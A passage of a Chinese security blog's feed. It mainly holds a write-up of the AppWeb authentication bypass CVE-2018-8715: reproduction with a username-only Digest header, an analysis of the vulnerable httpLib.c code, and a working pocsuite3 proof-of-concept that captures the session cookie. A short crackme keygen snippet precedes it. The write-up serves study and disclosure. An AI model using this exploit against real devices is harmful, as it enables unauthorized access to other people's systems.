class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#  author ol4three</span><br><span class="line">i   &#x3D;   str(input())</span><br><span class="line">i_len &#x3D; len(str(i))</span><br><span class="line">print i_len</span><br><span class="line">i_len &#x3D; i_len * 0x17CFb</span><br><span class="line">flag &#x3D; ord(i[0]) + i_len</span><br><span class="line">print &quot;AKA-&quot; + str(flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;首先打开进行查看&quot;&gt;&lt;a href=&quot;#首先打开进行查看&quot; class=&quot;headerlink&quot; title=&quot;首先打开进行查看&quot;&gt;&lt;/a&gt;首先打开进行查看&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyu
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="crackme" scheme="http://www.ol4three.com/tags/crackme/"/>
    
  </entry>
  
  <entry>
    <title>AppWeb认证绕过漏洞(CVE-2018-8715)</title>
    <link href="http://www.ol4three.com/2020/12/22/WEB/Exploit/AppWeb/AppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2018-8715/"/>
    <id>http://www.ol4three.com/2020/12/22/WEB/Exploit/AppWeb/AppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2018-8715/</id>
    <published>2020-12-22T02:32:05.000Z</published>
    <updated>2020-12-23T08:51:00.277Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote><p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p></blockquote><p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、basic 传统HTTP基础认证</span><br><span class="line"></span><br><span class="line">2、digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</span><br><span class="line"></span><br><span class="line">3、form 表单认证</span><br></pre></td></tr></table></figure><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为null（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接</p><p>认证成功，并返回session。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问页面如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222103500284.png" alt="image-20201222103500284"></p><p>构造的get数据包，加入我们构造的usename字段，注意用户名是已经存在的才可以进行构造</p><p>Authorization: Digest username=admin</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222104134406.png" alt="image-20201222104134406"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222104813555.png" alt="image-20201222104813555"></p><p>即可登陆成功</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参<br>数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p><p>漏洞位置在<a href="https://github.com/embedthis/appweb/blob/v7.0.2/paks/http/dist/httpLib.c">appweb/paks/http/dist/httpLib.c 2</a></p><p>首先是<code>function authCondition()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    This condition is used to implement all user authentication for routes</span><br><span class="line"> *&#x2F;</span><br><span class="line">static int authCondition(HttpConn *conn, HttpRoute *route, HttpRouteOp *op)</span><br><span class="line">&#123;</span><br><span class="line">    HttpAuth    *auth;</span><br><span class="line">    cchar       *username, *password;</span><br><span class="line"></span><br><span class="line">    assert(conn);</span><br><span class="line">    assert(route);</span><br><span class="line"></span><br><span class="line">    auth &#x3D; route-&gt;auth;</span><br><span class="line">    if (!auth || !auth-&gt;type) &#123;</span><br><span class="line">        &#x2F;* Authentication not required *&#x2F;</span><br><span class="line">        return HTTP_ROUTE_OK;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!httpIsAuthenticated(conn)) &#123;</span><br><span class="line">        httpGetCredentials(conn, &amp;username, &amp;password);</span><br><span class="line">        if (!httpLogin(conn, username, password)) &#123;</span><br><span class="line">            if (!conn-&gt;tx-&gt;finalized) &#123;</span><br><span class="line">                if (auth &amp;&amp; auth-&gt;type) &#123;</span><br><span class="line">                    (auth-&gt;type-&gt;askLogin)(conn);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    httpError(conn, HTTP_CODE_UNAUTHORIZED, &quot;Access Denied, login required&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                &#x2F;* Request has been denied and a response generated. So OK to accept this route. *&#x2F;</span><br><span class="line">            &#125;</span><br><span class="line">            return HTTP_ROUTE_OK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!httpCanUser(conn, NULL)) &#123;</span><br><span class="line">        httpTrace(conn, &quot;auth.check&quot;, &quot;error&quot;, &quot;msg:&#39;Access denied, user is not authorized for access&#39;&quot;);</span><br><span class="line">        if (!conn-&gt;tx-&gt;finalized) &#123;</span><br><span class="line">            httpError(conn, HTTP_CODE_FORBIDDEN, &quot;Access denied. User is not authorized for access.&quot;);</span><br><span class="line">            &#x2F;* Request has been denied and a response generated. So OK to accept this route. *&#x2F;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;* OK to accept route. This does not mean the request was authenticated - an error may have been already generated *&#x2F;</span><br><span class="line">    return HTTP_ROUTE_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数负责调用两个用于认证处理的函数：<code>getCredentials</code>和<code>httpLogin</code>，注意到<code>httpGetCredentials</code>周围缺少检查，这将会在稍后起到作用</p><p><code>httpGetCredentials()</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    Get the username and password credentials. If using an in-protocol auth scheme like basic|digest, the</span><br><span class="line">    rx-&gt;authDetails will contain the credentials and the parseAuth callback will be invoked to parse.</span><br><span class="line">    Otherwise, it is expected that &quot;username&quot; and &quot;password&quot; fields are present in the request parameters.</span><br><span class="line">    This is called by authCondition which thereafter calls httpLogin</span><br><span class="line"> *&#x2F;</span><br><span class="line">PUBLIC bool httpGetCredentials(HttpConn *conn, cchar **username, cchar **password)</span><br><span class="line">&#123;</span><br><span class="line">    HttpAuth    *auth;</span><br><span class="line"></span><br><span class="line">    assert(username);</span><br><span class="line">    assert(password);</span><br><span class="line">    *username &#x3D; *password &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">    auth &#x3D; conn-&gt;rx-&gt;route-&gt;auth;</span><br><span class="line">    if (!auth || !auth-&gt;type) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (auth-&gt;type) &#123;</span><br><span class="line">        if (conn-&gt;authType &amp;&amp; !smatch(conn-&gt;authType, auth-&gt;type-&gt;name)) &#123;</span><br><span class="line">            if (!(smatch(auth-&gt;type-&gt;name, &quot;form&quot;) &amp;&amp; conn-&gt;rx-&gt;flags &amp; HTTP_POST)) &#123;</span><br><span class="line">                &#x2F;* If a posted form authentication, ignore any basic|digest details in request *&#x2F;</span><br><span class="line">                return 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (auth-&gt;type-&gt;parseAuth &amp;&amp; (auth-&gt;type-&gt;parseAuth)(conn, username, password) &lt; 0) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        *username &#x3D; httpGetParam(conn, &quot;username&quot;, 0);</span><br><span class="line">        *password &#x3D; httpGetParam(conn, &quot;password&quot;, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数接收两个指向数组的指针用于从请求中解析<code>username</code>和<code>password</code>。既然<code>authCondition</code>没有进行参数检查，那么<code>parseAuth</code>失败也无关紧要。这意味着我们能够插入<code>WWW-Authenticate header</code>或者post任何我们想要的认证数据</p><p><code>httpLogin()</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    Login the user and create an authenticated session state store</span><br><span class="line"> *&#x2F;</span><br><span class="line">PUBLIC bool httpLogin(HttpConn *conn, cchar *username, cchar *password)</span><br><span class="line">&#123;</span><br><span class="line">    HttpRx          *rx;</span><br><span class="line">    HttpAuth        *auth;</span><br><span class="line">    HttpSession     *session;</span><br><span class="line">    HttpVerifyUser  verifyUser;</span><br><span class="line"></span><br><span class="line">    rx &#x3D; conn-&gt;rx;</span><br><span class="line">    auth &#x3D; rx-&gt;route-&gt;auth;</span><br><span class="line">    if (!username || !*username) &#123;</span><br><span class="line">        httpTrace(conn, &quot;auth.login.error&quot;, &quot;error&quot;, &quot;msg:&#39;missing username&#39;&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!auth-&gt;store) &#123;</span><br><span class="line">        mprLog(&quot;error http auth&quot;, 0, &quot;No AuthStore defined&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if ((verifyUser &#x3D; auth-&gt;verifyUser) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        if (!auth-&gt;parent || (verifyUser &#x3D; auth-&gt;parent-&gt;verifyUser) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            verifyUser &#x3D; auth-&gt;store-&gt;verifyUser;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!verifyUser) &#123;</span><br><span class="line">        mprLog(&quot;error http auth&quot;, 0, &quot;No user verification routine defined on route %s&quot;, rx-&gt;route-&gt;pattern);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (auth-&gt;username &amp;&amp; *auth-&gt;username) &#123;</span><br><span class="line">        &#x2F;* If using auto-login, replace the username *&#x2F;</span><br><span class="line">        username &#x3D; auth-&gt;username;</span><br><span class="line">        password &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(verifyUser)(conn, username, password)) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(auth-&gt;flags &amp; HTTP_AUTH_NO_SESSION) &amp;&amp; !auth-&gt;store-&gt;noSession) &#123;</span><br><span class="line">        if ((session &#x3D; httpCreateSession(conn)) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            &#x2F;* Too many sessions *&#x2F;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        httpSetSessionVar(conn, HTTP_SESSION_USERNAME, username);</span><br><span class="line">        httpSetSessionVar(conn, HTTP_SESSION_IP, conn-&gt;ip);</span><br><span class="line">    &#125;</span><br><span class="line">    rx-&gt;authenticated &#x3D; 1;</span><br><span class="line">    rx-&gt;authenticateProbed &#x3D; 1;</span><br><span class="line">    conn-&gt;username &#x3D; sclone(username);</span><br><span class="line">    conn-&gt;encoded &#x3D; 0;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一函数会检查username是否为空，当存在session时，password指针可以为空，所以设置空密码指针，即使返回错误，也不会被authCondition检查，允许我们绕过身份验证</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222111637408.png" alt="image-20201222111637408"></p><p>用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p><h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">from collections import OrderedDict</span><br><span class="line">from pocsuite3.api import Output, POCBase, OptString, register_poc, requests</span><br><span class="line"></span><br><span class="line">class AppWebPoc(POCBase):</span><br><span class="line">vulID &#x3D; &#39;003&#39;</span><br><span class="line">version &#x3D; &#39;1.0&#39;</span><br><span class="line">author &#x3D; [&#39;ol4three&#39;]</span><br><span class="line">vulDate &#x3D; &#39;2020-12-22&#39;</span><br><span class="line">updateDate &#x3D; &#39;2020-12-22&#39;</span><br><span class="line">references &#x3D; [&#39;https:&#x2F;&#x2F;ssd-disclosure.com&#x2F;ssd-advisory-appweb-authentication-bypass-digest-and-forms&#x2F;&#39;]</span><br><span class="line">name &#x3D; &#39;AppWeb CVE-2018-8715&#39;</span><br><span class="line">appPowerLink &#x3D; &#39;https:&#x2F;&#x2F;www.embedthis.com&#x2F;&#39;</span><br><span class="line">appName &#x3D; &#39;AppWeb&#39;</span><br><span class="line">appVersion &#x3D; &#39;&lt;7.0.3&#39;</span><br><span class="line">vulType &#x3D; &#39;Login Bypass&#39;</span><br><span class="line">desc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> session</span><br><span class="line"> &#39;&#39;&#39;</span><br><span class="line">pocDesc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> pocsuite -r ***.py -u target --verify&quot;</span><br><span class="line"> &#39;&#39;&#39;</span><br><span class="line">samples &#x3D; []</span><br><span class="line">install_requires &#x3D; []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def _options(self):</span><br><span class="line">o &#x3D; OrderedDict()</span><br><span class="line">o[&quot;username&quot;] &#x3D; OptString(&#39;&#39;, description&#x3D;&#39;这个poc需要用户登录，请输入登录账号&#39;, require&#x3D;True)</span><br><span class="line">return o</span><br><span class="line"></span><br><span class="line">def _verify(self):</span><br><span class="line">result &#x3D; &#123;&#125;</span><br><span class="line">payload &#x3D; self.get_option(&quot;username&quot;)</span><br><span class="line">#payload &#x3D; &quot;username&#x3D;&#123;0&#125;&quot;.format(self.get_option(&quot;username&quot;))</span><br><span class="line">url &#x3D; self.url</span><br><span class="line">headers&#x3D;&#123;</span><br><span class="line">&#39;Authorization&#39;:  &#39;Digest username&#x3D;&quot;&#39; +str(payload) +&#39;&quot;&#39;</span><br><span class="line">&#125;</span><br><span class="line"># proxies&#x3D;&#123;</span><br><span class="line"># &#39;http&#39;:&#39;127.0.0.1:8080&#39;,</span><br><span class="line"># &#39;https&#39;:&#39;127.0.0.1:8080&#39;</span><br><span class="line"># &#125;</span><br><span class="line">r &#x3D; requests.get(url, headers&#x3D;headers)</span><br><span class="line">if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">result[&#39;VerifyInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line">result[&#39;VerifyInfo&#39;][&#39;URL&#39;] &#x3D; url</span><br><span class="line">result[&#39;VerifyInfo&#39;][&#39;set-cookie&#39;] &#x3D; r.headers[&#39;set-cookie&#39;]</span><br><span class="line">return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">def parse_output(self, result):</span><br><span class="line"> output &#x3D; Output(self)</span><br><span class="line"> if result:</span><br><span class="line"> output.success(result)</span><br><span class="line"> else:</span><br><span class="line"> output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line"> return output</span><br><span class="line"></span><br><span class="line">def _attack(self):</span><br><span class="line">return self._verify()</span><br><span class="line"></span><br><span class="line">register_poc(AppWebPoc)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222135500449.png" alt="image-20201222135500449"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web 
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="AppWeb" scheme="http://www.ol4three.com/tags/AppWeb/"/>
    
  </entry>
  
</feed>
